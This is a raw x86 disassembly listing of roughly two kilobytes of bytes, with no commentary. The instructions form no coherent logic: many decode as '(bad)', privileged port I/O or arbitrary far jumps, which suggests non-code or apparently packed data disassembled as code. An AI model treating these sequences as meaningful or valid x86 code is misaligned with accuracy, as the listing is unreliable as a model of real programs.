  4038c0:	imul   ecx,DWORD PTR [esi+eiz*4],0x39d67bc
  4038c7:	xchg   edi,eax
  4038c8:	sar    edx,1
  4038ca:	dec    ecx
  4038cb:	inc    ebx
  4038cc:	loop   0x403930
  4038ce:	loope  0x403880
  4038d0:	ret    0xc042
  4038d3:	loope  0x4038cd
  4038d5:	scas   eax,DWORD PTR es:[edi]
  4038d6:	sbb    eax,0x948593e9
  4038db:	test   BYTE PTR [eax],dh
  4038dd:	pop    esi
  4038de:	push   0x64
  4038e0:	add    al,BYTE PTR [ebp-0x27e1be59]
  4038e6:	addr16 repz aam 0x31
  4038ea:	push   ebx
  4038eb:	lods   eax,DWORD PTR ds:[esi]
  4038ec:	scas   eax,DWORD PTR es:[edi]
  4038ed:	lea    esi,[ebx+0x2d]
  4038f0:	jo     0x40392b
  4038f2:	jbe    0x4038f9
  4038f4:	xchg   ebp,eax
  4038f5:	cwde   
  4038f6:	fisttp WORD PTR [ebx+eax*4]
  4038f9:	and    esi,ecx
  4038fb:	lahf   
  4038fc:	out    0xf6,eax
  4038fe:	in     eax,dx
  4038ff:	daa    
  403900:	mov    edx,0x9bfa2ac3
  403905:	sbb    al,0xe0
  403907:	jne    0x403969
  403909:	mov    eax,0x368a1063
  40390e:	nop
  40390f:	(bad)  
  403910:	inc    eax
  403911:	mov    ds:0x2d288f35,al
  403916:	std    
  403917:	push   cs
  403918:	fwait
  403919:	outs   dx,DWORD PTR ds:[esi]
  40391a:	xchg   bl,dh
  40391c:	in     eax,0xb3
  40391e:	and    eax,0x65ae51ee
  403923:	pop    esp
  403924:	scas   al,BYTE PTR es:[edi]
  403925:	lods   eax,DWORD PTR ds:[esi]
  403926:	xor    ebp,DWORD PTR [ebp+0x5b]
  403929:	push   ss
  40392a:	sbb    BYTE PTR [ecx],bh
  40392c:	adc    al,0x47
  40392e:	adc    bl,BYTE PTR [ebp-0x13e9117d]
  403934:	mov    BYTE PTR [edx],cl
  403936:	cmp    eax,0xcf2e7f16
  40393b:	and    eax,0x18510a0d
  403940:	cmp    DWORD PTR fs:[ebx-0x7d010e37],ecx
  403947:	(bad)  
  403948:	out    dx,eax
  403949:	pop    edx
  40394a:	(bad)  
  40394b:	int3   
  40394c:	add    esi,DWORD PTR [eax-0x4b]
  40394f:	push   esp
  403950:	imul   eax,eax,0x931bcfe6
  403956:	adc    eax,0xb81e9224
  40395b:	in     eax,dx
  40395c:	int3   
  40395d:	pop    ebp
  40395e:	sti    
  40395f:	mov    al,0xdb
  403961:	jmp    0x7526:0xf1c55932
  403968:	imul   esp
  40396a:	cli    
  40396b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40396c:	xor    al,0x66
  40396e:	mul    BYTE PTR [edi]
  403970:	pop    edx
  403971:	sbb    esp,DWORD PTR [ebx]
  403973:	imul   esp,DWORD PTR [edi],0xffffffed
  403976:	push   cs
  403977:	mov    fs,edx
  403979:	add    ecx,ecx
  40397b:	mov    eax,ds:0x94e293af
  403980:	xor    eax,0xb7391ddc
  403985:	mov    ah,0x91
  403987:	xchg   DWORD PTR [edx+esi*4-0x2e0308f],ecx
  40398e:	(bad)  
  40398f:	and    eax,DWORD PTR [ecx]
  403991:	jae    0x403981
  403993:	jg     0x403a02
  403995:	adc    bp,dx
  403998:	mov    esp,0x5a9afeef
  40399d:	(bad)  
  40399e:	mov    BYTE PTR [esi-0x5f6ca940],bl
  4039a4:	pop    ebx
  4039a5:	jecxz  0x4039f1
  4039a7:	stos   DWORD PTR es:[edi],eax
  4039a8:	in     al,dx
  4039a9:	dec    eax
  4039aa:	xchg   ebx,eax
  4039ab:	cdq    
  4039ac:	inc    ebp
  4039ad:	inc    ebp
  4039ae:	fist   WORD PTR [esi+edx*8]
  4039b1:	les    edx,FWORD PTR [eax+0x9]
  4039b4:	rcr    DWORD PTR [eax+0x75],cl
  4039b7:	scas   eax,DWORD PTR es:[edi]
  4039b8:	shr    BYTE PTR [edx+eax*4-0x5378b17a],0x8
  4039c0:	aas    
  4039c1:	and    al,0x6c
  4039c3:	dec    ebp
  4039c4:	mov    edi,0x76c94891
  4039c9:	dec    ecx
  4039ca:	lods   al,BYTE PTR ds:[esi]
  4039cb:	test   eax,0x21ea161c
  4039d0:	ja     0x4039d5
  4039d2:	mov    BYTE PTR [ebp-0x56],0x1c
  4039d6:	imul   ebp,DWORD PTR [edx],0x62
  4039d9:	xchg   esp,eax
  4039da:	imul   esi,edx,0xb6b6a2c
  4039e0:	ins    BYTE PTR es:[edi],dx
  4039e1:	aas    
  4039e2:	outs   dx,BYTE PTR ds:[esi]
  4039e3:	int    0xc5
  4039e5:	pop    esp
  4039e6:	out    0x6a,eax
  4039e8:	inc    eax
  4039e9:	push   edi
  4039ea:	out    0xee,al
  4039ec:	sub    DWORD PTR fs:[ecx],0xe6cd3086
  4039f3:	add    BYTE PTR [ebp+0x10],ch
  4039f6:	ror    DWORD PTR ds:0x4165c879,0x4d
  4039fd:	push   eax
  4039fe:	in     eax,dx
  4039ff:	pop    ds
  403a00:	int3   
  403a01:	call   0x83c5:0xbaec14ab
  403a08:	pop    ebp
  403a09:	xchg   eax,eax
  403a0b:	out    dx,al
  403a0c:	daa    
  403a0d:	sub    ch,BYTE PTR gs:[eax+0x795456aa]
  403a14:	mov    ebp,0x580cce4
  403a19:	jmp    0x403a14
  403a1b:	loope  0x4039ea
  403a1d:	and    al,0xc7
  403a1f:	lods   al,BYTE PTR ds:[esi]
  403a20:	js     0x403a12
  403a22:	add    esp,DWORD PTR [eax]
  403a24:	les    edx,FWORD PTR [ebx]
  403a26:	pop    ds
  403a27:	int    0x49
  403a29:	pop    eax
  403a2a:	dec    ebx
  403a2b:	xchg   ebx,eax
  403a2c:	std    
  403a2d:	xor    al,0x14
  403a2f:	cmc    
  403a30:	lods   eax,DWORD PTR ds:[esi]
  403a31:	sub    BYTE PTR [edi+0x39],dh
  403a34:	lods   eax,DWORD PTR ds:[esi]
  403a35:	or     dh,al
  403a37:	out    dx,eax
  403a38:	sbb    ebx,DWORD PTR [eax+0x33d17e3c]
  403a3e:	in     al,dx
  403a3f:	call   0x571c88ad
  403a44:	and    ecx,esp
  403a46:	pop    ecx
  403a47:	adc    al,0x49
  403a49:	add    al,0x3f
  403a4b:	pop    esp
  403a4c:	dec    eax
  403a4d:	push   0xffffffc6
  403a4f:	(bad)  
  403a50:	cmp    DWORD PTR [esp+ebx*4+0x1f],esp
  403a54:	mov    al,ds:0x704584a5
  403a59:	out    0x53,al
  403a5b:	xchg   ecx,eax
  403a5c:	xchg   esp,eax
  403a5d:	pusha  
  403a5e:	jns    0x403a68
  403a60:	fs xor esp,0xfc034c91
  403a67:	adc    eax,0x371159d1
  403a6c:	ds mov ebp,0xc96efc6a
  403a72:	nop
  403a73:	mov    ebp,0x656b73f
  403a78:	je     0x403a8a
  403a7a:	lods   al,BYTE PTR ds:[esi]
  403a7b:	adc    eax,0x3e054f7b
  403a80:	jge    0x403ab4
  403a82:	mov    esp,0x7626d1e1
  403a87:	cmp    bh,BYTE PTR [ebx]
  403a89:	inc    edi
  403a8a:	push   0xf4b03f13
  403a8f:	and    ecx,DWORD PTR [ecx+0x61]
  403a92:	(bad)  
  403a93:	jae    0x403a21
  403a95:	sahf   
  403a96:	jne    0x403ac1
  403a98:	jo     0x403ad4
  403a9a:	(bad)  
  403a9b:	out    dx,al
  403a9c:	hlt    
  403a9d:	lods   al,BYTE PTR ds:[esi]
  403a9e:	pop    ss
  403a9f:	fisttp WORD PTR [ecx]
  403aa1:	jne    0x403ae8
  403aa3:	lods   eax,DWORD PTR ds:[esi]
  403aa4:	stc    
  403aa5:	pop    ebp
  403aa6:	sbb    ecx,esp
  403aa8:	call   0x3885:0x16a85b9d
  403aaf:	mov    esi,0x8280f3e6
  403ab4:	cdq    
  403ab5:	das    
  403ab6:	jge    0x403ae1
  403ab8:	push   es
  403ab9:	mov    bl,0x8a
  403abb:	lahf   
  403abc:	adc    esi,DWORD PTR fs:[eax+0x7b]
  403ac0:	aam    0x79
  403ac2:	jecxz  0x403b00
  403ac4:	lods   al,BYTE PTR ds:[esi]
  403ac5:	sub    al,dl
  403ac7:	arpl   di,bx
  403ac9:	iret   
  403aca:	data16 cmp al,0x4b
  403acd:	mov    BYTE PTR [edx+0x2d287af7],dl
  403ad3:	in     al,0x15
  403ad5:	inc    ebp
  403ad6:	aam    0x8d
  403ad8:	push   es
  403ad9:	mov    bl,0xae
  403adb:	out    dx,eax
  403adc:	dec    edx
  403add:	js     0x403a84
  403adf:	xor    cl,BYTE PTR [edi-0x2e6aa57f]
  403ae5:	xor    eax,0x9308666
  403aea:	mov    cl,0x7b
  403aec:	fsub   DWORD PTR [ebp+0x58c129a6]
  403af2:	in     eax,dx
  403af3:	mov    ss,WORD PTR [esi]
  403af5:	imul   esi,ecx,0xd3624236
  403afb:	xor    al,BYTE PTR [edi]
  403afd:	and    DWORD PTR [edx+edx*8-0x7ee67dff],ebp
  403b04:	inc    esi
  403b05:	sub    eax,0x85073765
  403b0a:	add    bh,BYTE PTR ds:0x9eb10195
  403b10:	pop    esi
  403b11:	xchg   BYTE PTR [ecx],al
  403b13:	lea    edx,[edi+edi*1]
  403b16:	(bad)  
  403b17:	mov    cs,WORD PTR [ebx-0x14]
  403b1a:	int    0xa7
  403b1c:	sbb    DWORD PTR [edi+ebx*2-0x7a],edi
  403b20:	pop    ebp
  403b21:	arpl   si,di
  403b23:	cmp    edx,esp
  403b25:	ret    
  403b26:	(bad)  
  403b27:	cli    
  403b28:	and    DWORD PTR [ecx],0x19871a6d
  403b2e:	fld    DWORD PTR [esi-0x21]
  403b31:	shl    BYTE PTR [esi-0x21],1
  403b34:	in     eax,dx
  403b35:	inc    esi
  403b36:	pop    ebx
  403b37:	inc    esi
  403b38:	and    BYTE PTR [esp+edi*4+0x1c],bh
  403b3c:	dec    esp
  403b3d:	mov    ecx,0xdf94ac61
  403b42:	js     0x403b73
  403b44:	and    BYTE PTR [ebp-0x4],0xa9
  403b48:	or     al,0x38
  403b4a:	cmp    DWORD PTR [edx+0x4a],esi
  403b4d:	(bad)  
  403b4e:	int3   
  403b4f:	sub    esp,DWORD PTR [eax+0x4e]
  403b52:	jle    0x403ad8
  403b54:	jecxz  0x403b2f
  403b56:	cmc    
  403b57:	shl    DWORD PTR [esi-0x98e5c93],cl
  403b5d:	add    eax,0x8f0f3458
  403b62:	in     eax,0x7b
  403b64:	in     eax,dx
  403b65:	in     al,dx
  403b66:	rcl    BYTE PTR [ecx+ebp*1],0x4d
  403b6a:	retf   0x494
  403b6d:	fimul  WORD PTR [edx-0x70]
  403b70:	lahf   
  403b71:	xchg   esp,eax
  403b72:	sbb    eax,0xea028e50
  403b77:	push   ds
  403b78:	dec    ebx
  403b79:	push   0x22
  403b7b:	scas   al,BYTE PTR es:[edi]
  403b7c:	xchg   DWORD PTR [edi-0xbb01484],ebx
  403b82:	rcl    DWORD PTR [esi-0x7e],cl
  403b85:	jmp    0x8b96:0x1ad4f97e
  403b8c:	pop    edx
  403b8d:	dec    DWORD PTR [edx]
  403b8f:	pop    es
  403b90:	add    dl,BYTE PTR [edx]
  403b92:	shr    DWORD PTR [eax+0x50],1
  403b95:	mov    esp,0x4ef4f86e
  403b9a:	pop    ebx
  403b9b:	mov    gs,esi
  403b9d:	sahf   
  403b9e:	call   0x4a598a14
  403ba3:	fld    st(3)
  403ba5:	stc    
  403ba6:	adc    al,0x4d
  403ba8:	sbb    dh,BYTE PTR [esi]
  403baa:	add    ebp,esi
  403bac:	jmp    0x403b4d
  403bae:	cmp    al,0xcf
  403bb0:	jae    0x403c1e
  403bb2:	cmp    BYTE PTR [esi+0x8a293c],dl
  403bb8:	stc    
  403bb9:	xchg   ebp,eax
  403bba:	pusha  
  403bbb:	jl     0x403b91
  403bbd:	je     0x403c14
  403bbf:	sub    eax,0x6a366367
  403bc4:	inc    edx
  403bc5:	jno    0x403c45
  403bc7:	(bad)  [eax+0x3ca91cf4]
  403bcd:	out    dx,al
  403bce:	cmc    
  403bcf:	fcomp  DWORD PTR [edi+0x13e8acea]
  403bd5:	fs mov bl,0x59
  403bd8:	(bad)  
  403bd9:	ja     0x403b88
  403bdb:	out    dx,al
  403bdc:	jb     0x403c14
  403bde:	jmp    0x403bae
  403be0:	xchg   esi,eax
  403be1:	into   
  403be2:	jo     0x403beb
  403be4:	pop    eax
  403be5:	adc    al,0x12
  403be7:	jno    0x403c64
  403be9:	xlat   BYTE PTR ds:[ebx]
  403bea:	sbb    esi,DWORD PTR [ebx]
  403bec:	repz inc esi
  403bee:	mov    ebp,0xe7acb9a8
  403bf3:	sbb    BYTE PTR ds:0xcecb9171,dh
  403bf9:	cdq    
  403bfa:	xchg   BYTE PTR [eax],ch
  403bfc:	jae    0x403be1
  403bfe:	mov    ch,0x97
  403c00:	(bad)  
  403c01:	jbe    0x403b99
  403c03:	push   ss
  403c04:	mov    eax,ds:0x5162a2bf
  403c09:	xor    eax,0x5c5084e5
  403c0e:	sbb    edx,DWORD PTR [eax+0x5bd8510d]
  403c14:	ficomp WORD PTR [edx-0xa31e123]
  403c1a:	daa    
  403c1b:	push   ebp
  403c1c:	jmp    0x403c28
  403c1e:	sbb    al,0x2f
  403c20:	in     al,0xa5
  403c22:	sub    eax,DWORD PTR [ecx]
  403c24:	mov    WORD PTR [esi+edx*8-0x118e0c3d],ss
  403c2b:	popa   
  403c2c:	jl     0x403bd2
  403c2e:	add    bh,bl
  403c30:	out    dx,eax
  403c31:	mov    bh,BYTE PTR [edx+0x6]
  403c34:	mov    bl,0xb1
  403c36:	fisub  WORD PTR [ecx-0x1e7b863b]
  403c3c:	sub    cl,BYTE PTR [ebx+0xe40bee9]
  403c42:	or     ah,BYTE PTR [ebx-0x525d89c9]
  403c48:	fstp   TBYTE PTR [esi]
  403c4a:	lods   eax,DWORD PTR ds:[esi]
  403c4b:	int3   
  403c4c:	inc    edx
  403c4d:	and    al,0xba
  403c4f:	stc    
  403c50:	jb     0x403c8b
  403c52:	push   0xffffff89
  403c54:	fnsave ds:0xdd0e0591
  403c5a:	dec    cx
  403c5c:	jl     0x403bea
  403c5e:	call   0xe1f8:0xbef26403
  403c65:	stos   DWORD PTR es:[edi],eax
  403c66:	ror    BYTE PTR [eax+0x6369f6f9],1
  403c6c:	push   eax
  403c6e:	sub    ebx,edi
  403c70:	mov    ch,0xc8
  403c72:	aas    
  403c73:	nop
  403c74:	push   ecx
  403c75:	ja     0x403cd6
  403c77:	aaa    
  403c78:	out    0x1a,eax
  403c7a:	mov    ds:0xd9f88d80,eax
  403c7f:	mov    edx,0xbad52539
  403c84:	leave  
  403c85:	sub    al,0x36
  403c87:	push   DWORD PTR [ecx-0x37]
  403c8a:	out    dx,al
  403c8b:	mov    edx,?
  403c8d:	ins    BYTE PTR es:[edi],dx
  403c8e:	mov    fs,WORD PTR [ecx+0x20fdbaa7]
  403c94:	mov    ?,WORD PTR [ebp+0x27]
  403c97:	mov    bh,0x96
  403c99:	add    BYTE PTR [ebx+0x18],ah
  403c9c:	and    BYTE PTR ds:0x8490288,bh
  403ca2:	stos   DWORD PTR es:[edi],eax
  403ca3:	pushf  
  403ca4:	jo     0x403d13
  403ca6:	sub    eax,DWORD PTR [esi+0x62]
  403ca9:	pop    esi
  403caa:	(bad)
  403cae:	mov    ecx,0xc8447a6
  403cb3:	push   esp
  403cb4:	inc    esp
  403cb5:	mov    esi,0x53e972fa
  403cba:	icebp  
  403cbb:	cli    
  403cbc:	(bad)  
  403cbd:	imul   ebx,esp,0x2d
  403cc0:	inc    edx
  403cc1:	mov    ebp,0x1c630ac8
  403cc6:	fist   WORD PTR ds:0x5cd8f545
  403ccc:	xchg   esp,eax
  403ccd:	jns    0x403cf7
  403ccf:	(bad)  [eax+eiz*1+0x253838d6]
  403cd6:	adc    eax,0x257d64e8
  403cdb:	adc    ah,BYTE PTR [edi+0x637d7d66]
  403ce1:	repz mov bl,0xf7
  403ce4:	dec    BYTE PTR [edi-0x6d03c02]
  403cea:	xor    BYTE PTR [ebx-0x11],al
  403ced:	mov    edi,0xf253b77
  403cf2:	aas    
  403cf3:	aad    0x29
  403cf5:	out    0x6e,eax
  403cf7:	sti    
  403cf8:	mov    eax,ds:0xe6eac52d
  403cfd:	pop    ss
  403cfe:	pop    edx
  403cff:	(bad)  
  403d00:	mov    esi,0xb2f77ee7
  403d05:	and    ebx,DWORD PTR [ebx-0x1f]
  403d08:	dec    ebx
  403d09:	neg    edx
  403d0b:	aad    0x6a
  403d0d:	inc    di
  403d0f:	xor    al,0x4b
  403d11:	fld    TBYTE PTR [ebx+0x7dbc8dff]
  403d17:	hlt    
  403d18:	les    eax,FWORD PTR [eax+0x331d7440]
  403d1e:	dec    edi
  403d1f:	enter  0xbaa,0x64
  403d23:	call   DWORD PTR [edx+edx*2]
  403d26:	cdq    
  403d27:	mov    bh,0xa0
  403d29:	push   ss
  403d2a:	jecxz  0x403d1c
  403d2c:	jb     0x403d43
  403d2e:	xor    eax,0xdd495abc
  403d33:	xchg   edi,ebp
  403d35:	retf   
  403d36:	cmp    al,0xfe
  403d38:	pop    esp
  403d39:	aas    
  403d3a:	jae    0x403d78
  403d3c:	dec    ebp
  403d3d:	jecxz  0x403cea
  403d3f:	xchg   esp,eax
  403d40:	(bad)  
  403d41:	mov    al,0x28
  403d43:	xor    BYTE PTR [edx-0x5e],cl
  403d46:	push   ebp
  403d47:	lea    eax,[ecx]
  403d49:	pop    ebp
  403d4a:	cli    
  403d4b:	cmp    DWORD PTR [eax],eax
  403d4d:	fld    DWORD PTR [edx]
  403d4f:	dec    eax
  403d50:	sahf   
  403d51:	ss daa 
  403d53:	push   esp
  403d54:	rol    DWORD PTR [ebx-0x198c8d68],cl
  403d5a:	xchg   edi,eax
  403d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d5c:	outs   dx,DWORD PTR ds:[esi]
  403d5d:	popf   
  403d5e:	cdq    
  403d5f:	(bad)  
  403d64:	leave  
  403d65:	mov    bl,0x22
  403d67:	dec    ecx
  403d68:	loope  0x403d1a
  403d6a:	stos   DWORD PTR es:[edi],eax
  403d6b:	pop    esp
  403d6c:	push   eax
  403d6d:	mov    bl,0x58
  403d6f:	sub    al,0x22
  403d71:	lock and DWORD PTR [edi],ecx
  403d74:	adc    dh,cl
  403d76:	inc    edi
  403d77:	push   0xaa7ffbb9
  403d7c:	or     eax,0x92fc8213
  403d81:	add    eax,DWORD PTR [edi+edi*4]
  403d84:	imul   esi,ecx,0xffffffc7
  403d87:	xor    ch,BYTE PTR [esi]
  403d89:	push   0x5a0d28a7
  403d8e:	cwde   
  403d8f:	sub    dl,BYTE PTR [edi+0x6e]
  403d92:	cmp    al,0x69
  403d94:	fisttp QWORD PTR [eax+0x20]
  403d97:	mov    eax,esp
  403d99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d9a:	sbb    BYTE PTR [esi+ebx*4+0x1a],bh
  403d9e:	add    eax,0xd52fb81e
  403da3:	imul   esp,DWORD PTR [edi-0xe],0xe13f2443
  403daa:	outs   dx,BYTE PTR ds:[esi]
  403dab:	sub    esp,DWORD PTR [esi]
  403dad:	mov    DWORD PTR [ebx],esi
  403daf:	mov    ds:0x39cd7cd4,al
  403db4:	sub    edx,edi
  403db6:	jle    0x403d59
  403db8:	push   ds
  403db9:	sub    al,0xa3
  403dbb:	dec    ecx
  403dbc:	loopne 0x403d81
  403dbe:	pop    edi
  403dbf:	xchg   ebp,eax
  403dc0:	push   edx
  403dc1:	fwait
  403dc2:	aas    
  403dc3:	jno    0x403e38
  403dc5:	mov    eax,0x21600dfa
  403dca:	jae    0x403d95
  403dcc:	out    0xe4,al
  403dce:	ins    BYTE PTR es:[edi],dx
  403dcf:	jnp    0x403e0b
  403dd1:	mov    eax,DWORD PTR [edi+0x67b09694]
  403dd7:	sub    BYTE PTR [eax-0x2f4e43db],cl
  403ddd:	out    dx,eax
  403dde:	mov    ah,BYTE PTR [edi+esi*2+0x3e]
  403de2:	in     eax,0x4c
  403de4:	or     DWORD PTR [edx],edx
  403de6:	test   DWORD PTR [edi],ebp
  403de8:	(bad)  
  403de9:	ds ds push eax
  403dec:	int3   
  403ded:	sub    eax,0xed1daa82
  403df2:	pop    DWORD PTR ss:[esi+edi*1]
  403df6:	cmc    
  403df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403df8:	mov    WORD PTR [ebp-0x43],es
  403dfb:	rcl    DWORD PTR [edi+0x78],cl
  403dfe:	pop    ebp
  403dff:	cmovo  esp,DWORD PTR [edx]
  403e02:	jns    0x403e75
  403e04:	ins    DWORD PTR es:[edi],dx
  403e05:	inc    esi
  403e06:	(bad)
  403e09:	mov    ebp,0xc0421
  403e0e:	arpl   WORD PTR [ebp+0x50acfc30],bx
  403e14:	es pusha 
  403e16:	adc    esi,DWORD PTR [edi+0x773e0226]
  403e1c:	xor    edi,DWORD PTR [esi]
  403e1e:	cmp    ebx,eax
  403e20:	sbb    eax,0xbfea24a3
  403e25:	inc    ecx
  403e26:	arpl   WORD PTR [ecx+0x60b8c81a],di
  403e2c:	shl    BYTE PTR [edx-0x51],0x7a
  403e30:	mov    esp,0x84309143
  403e35:	fwait
  403e36:	retf   
  403e37:	xchg   edx,eax
  403e38:	lods   eax,DWORD PTR ds:[esi]
  403e39:	clc    
  403e3a:	repnz fadd st(5),st
  403e3d:	das    
  403e3e:	mov    ds:0xbc1caa8f,al
  403e43:	mov    ah,0xaf
  403e45:	jne    0x403dcf
  403e47:	xchg   esp,eax
  403e48:	std    
  403e49:	sbb    eax,0xf7836d3f
  403e4e:	inc    eax
  403e4f:	push   cs
  403e50:	shl    DWORD PTR [eax],0x47
  403e53:	mov    BYTE PTR [ecx-0x611a4bce],dl
  403e59:	lods   eax,DWORD PTR ds:[esi]
  403e5a:	jg     0x403e4c
  403e5c:	lods   eax,DWORD PTR ds:[esi]
  403e5d:	mov    edx,ebp
  403e5f:	mov    ds:0x99dcdb9b,eax
  403e64:	push   ecx
  403e66:	popa   
  403e67:	inc    ebp
  403e68:	or     ch,BYTE PTR ds:0x6d40e76d
  403e6e:	ficomp WORD PTR gs:[esi]
  403e71:	mov    eax,ds:0xf15328a
  403e76:	rcr    BYTE PTR ds:0xf788871,0xd6
  403e7d:	fiadd  WORD PTR [edi-0x68]
  403e80:	mov    ecx,DWORD PTR [eax-0x45]
  403e83:	(bad)  
  403e85:	loopne 0x403f06
  403e87:	pop    esp
  403e88:	mov    al,0x1f
  403e8a:	inc    edi
  403e8b:	lds    edi,FWORD PTR [edi]
  403e8d:	or     bh,bh
  403e8f:	mov    ?,WORD PTR [ebp-0x4e]
  403e92:	xchg   esp,eax
  403e93:	icebp  
  403e94:	out    dx,al
  403e95:	cmp    bh,BYTE PTR [ecx]
  403e97:	mov    esi,0xf43af00b
  403e9c:	ror    DWORD PTR [ebx],cl
  403e9e:	ins    DWORD PTR es:[edi],dx
  403e9f:	stos   DWORD PTR es:[edi],eax
  403ea0:	jle    0x403e5d
  403ea2:	push   ss
  403ea3:	inc    ebp
  403ea4:	or     al,0x5d
  403ea6:	jb     0x403e60
  403ea8:	and    esi,edi
  403eaa:	mov    ah,0x87
  403eac:	fs mov esp,0x9b02e7be
  403eb2:	call   0xc3ea:0x6684e8e3
  403eb9:	mov    eax,ds:0xca1c42f5
  403ebe:	fiadd  DWORD PTR [ecx]
  403ec0:	das    
  403ec1:	and    DWORD PTR [ecx+0x49],0x1772a90a
  403ec8:	ret    0xcf13
  403ecb:	out    0x2f,eax
  403ecd:	cmp    al,0x54
  403ecf:	into   
  403ed0:	ret    
  403ed1:	push   0x4add9725
  403ed6:	mov    eax,0x9c9b48da
  403edb:	mov    ah,0xb8
  403edd:	loop   0x403e8e
  403edf:	pushf  
  403ee0:	sahf   
  403ee1:	leave  
  403ee2:	fnstcw WORD PTR [edi]
  403ee4:	daa    
  403ee5:	fcom   QWORD PTR [ebp-0x58a3a48b]
  403eeb:	inc    eax
  403eec:	jge    0x403ee7
  403eee:	xchg   esi,eax
  403eef:	sub    eax,0x72a90141
  403ef4:	jp     0x403f73
  403ef6:	hlt    
  403ef7:	sub    BYTE PTR [edx],dh
  403ef9:	inc    esp
  403efa:	pop    edi
  403efb:	jae    0x403efd
  403efd:	and    BYTE PTR [ecx],0x73
  403f00:	imul   ecx,DWORD PTR [edi+0x1a],0xffffffbb
  403f04:	push   edi
  403f05:	sub    esp,DWORD PTR [edi]
  403f07:	lods   eax,DWORD PTR ds:[esi]
  403f08:	cli    
  403f09:	mov    al,0xd8
  403f0b:	push   edx
  403f0c:	mov    cl,0x1d
  403f0e:	call   0x110de1f4
  403f13:	popa   
  403f14:	dec    edi
  403f15:	dec    edx
  403f16:	mov    ch,0x40
  403f18:	push   ebx
  403f19:	cmp    al,0x1b
  403f1b:	aaa    
  403f1c:	pop    ss
  403f1d:	add    eax,DWORD PTR [edi]
  403f1f:	sar    DWORD PTR [eax+esi*4+0x2ba85aeb],cl
  403f26:	std    
  403f27:	sub    al,0x2f
  403f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f2a:	das    
  403f2b:	mov    BYTE PTR [ecx-0x6c3678c8],ah
  403f31:	lds    edi,FWORD PTR [edi]
  403f33:	sbb    BYTE PTR [eax-0x72],0x58
  403f37:	rcl    ebp,cl
  403f39:	cmp    al,0xc
  403f3b:	popf   
  403f3c:	xor    ecx,DWORD PTR [ebx-0x52]
  403f3f:	gs icebp 
  403f41:	stos   BYTE PTR es:[edi],al
  403f42:	xor    eax,0x9c2d8754
  403f47:	retf   
  403f48:	rcr    BYTE PTR [edi+eax*1+0x73],0x93
  403f4d:	lahf   
  403f4e:	adc    ebx,DWORD PTR [ecx+edx*1-0x21]
  403f52:	sbb    al,0x3c
  403f54:	mov    WORD PTR [ebx-0x45],es
  403f57:	or     edx,DWORD PTR [ecx]
  403f59:	adc    eax,ebx
  403f5b:	jno    0x403f28
  403f5d:	and    bh,BYTE PTR [ecx]
  403f5f:	sti    
  403f60:	scas   al,BYTE PTR es:[edi]
  403f61:	test   al,0xda
  403f63:	jle    0x403f9c
  403f65:	pop    edi
  403f66:	fnstcw WORD PTR es:[ecx-0xe]
  403f6a:	fdivr  QWORD PTR [eax]
  403f6c:	fsubr  st,st(4)
  403f6e:	push   esp
  403f6f:	popa   
  403f70:	cmp    bl,BYTE PTR [ebx+eiz*8]
  403f73:	loope  0x403f3d
  403f75:	loopne 0x403f5d
  403f77:	out    dx,al
  403f78:	push   esp
  403f79:	push   eax
  403f7a:	sub    al,0xe5
  403f7c:	repnz inc ecx
  403f7e:	adc    eax,0x3455fc4f
  403f83:	pop    ebp
  403f84:	pop    esp
  403f85:	or     DWORD PTR [ebx-0x75309f8e],esi
  403f8b:	aas    
  403f8c:	mov    dh,0xf5
  403f8e:	ins    BYTE PTR es:[edi],dx
  403f8f:	xor    edi,edi
  403f91:	or     bl,BYTE PTR [ebx+0xd861d16]
  403f97:	fsubr  st(4),st
  403f99:	inc    eax
  403f9a:	push   ds
  403f9b:	outs   dx,BYTE PTR ds:[esi]
  403f9c:	das    
  403f9d:	fmul   QWORD PTR ds:0x7658ee28
  403fa3:	jp     0x403fc9
  403fa5:	xchg   esp,eax
  403fa6:	or     cl,ch
  403fa8:	bound  edi,QWORD PTR [eax]
  403faa:	add    bl,BYTE PTR [ecx]
  403fac:	push   ecx
  403fad:	ret    0x4bf6
  403fb0:	imul   edx,DWORD PTR [ecx-0x93bb65d],0xffffffad
  403fb7:	aas    
  403fb8:	mov    al,ds:0x3aa72872
  403fbd:	neg    BYTE PTR [ecx+ebp*4-0x72]
  403fc1:	jp     0x403fd8
  403fc3:	clc    
  403fc4:	jle    0x403f55
  403fc6:	outs   dx,BYTE PTR ds:[esi]
  403fc7:	mov    BYTE PTR [esi+0x30],cl
  403fca:	lds    esi,FWORD PTR [ecx-0xd]
  403fcd:	loopne 0x403f9a
  403fcf:	mov    ebx,0xa6ddb73e
  403fd4:	shl    BYTE PTR [esi-0xa],1
  403fd7:	cli    
  403fd8:	adc    ecx,ebx
  403fda:	inc    edx
  403fdb:	js     0x404020
  403fdd:	add    al,0xc7
  403fdf:	inc    ebx
  403fe0:	fidiv  DWORD PTR [eax-0x35c0e98d]
  403fe6:	xchg   ah,dh
  403fe8:	push   ebx
  403fe9:	push   ecx
  403fea:	add    BYTE PTR [ebx+0x5b],dl
  403fed:	sbb    ebx,DWORD PTR [edx-0x55]
  403ff0:	loopne 0x40403c
  403ff2:	repz loopne 0x403f7a
  403ff5:	mov    esi,0x1c451db2
  403ffa:	out    dx,al
  403ffb:	mov    eax,0xacda120e
  404000:	(bad)  
  404001:	nop
  404002:	lahf   
  404003:	scas   al,BYTE PTR es:[edi]
  404004:	xor    eax,DWORD PTR [eax]
  404006:	test   al,0x22
  404008:	arpl   WORD PTR [edx+ebx*1-0x350adbc],ax
  40400f:	ins    DWORD PTR es:[edi],dx
  404010:	imul   esi,ebp,0x71
  404013:	mov    dl,0xc3
  404015:	aaa    
  404016:	leave  
  404017:	out    0xfa,eax
  404019:	pop    edi
  40401a:	or     dh,BYTE PTR [edx+ecx*1]
  40401d:	cmp    dl,BYTE PTR [ebx-0x1355fc44]
  404023:	(bad)  
  404024:	mov    ah,0x91
  404026:	mov    WORD PTR [eax],ds
  404028:	mov    esp,0x7429095e
  40402d:	imul   ecx,DWORD PTR [ebp+0x4e],0xc4d63c0f
  404034:	dec    esp
  404035:	push   edx
  404036:	in     al,0x33
  404038:	jno    0x40407f
  40403a:	out    dx,al
  40403b:	pusha  
  40403c:	push   ss
  40403d:	sbb    ah,BYTE PTR [ebp+0x4d]
